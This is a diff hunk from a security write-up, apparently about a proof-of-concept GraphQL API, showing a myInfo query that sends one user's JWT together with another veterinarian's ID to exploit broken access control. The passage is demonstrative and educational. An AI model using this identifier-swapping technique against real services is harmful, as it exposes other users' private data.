@@ -62,7 +62,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3M
 
 I send a GraphQL request to the query `myInfo(...)` using the obtained access token BUT I specify the identifier **2** that the one of **Dr Benoit**:
 
-```text
+```
 query brokenAccessControl {
   myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNTQ2NDQyOTAyfQ.H9A-vXRsiivFGShtdhiR3N2lSDDx-sNqbbJxMRNnExI", veterinaryId: 2){
     id, name, dogs {
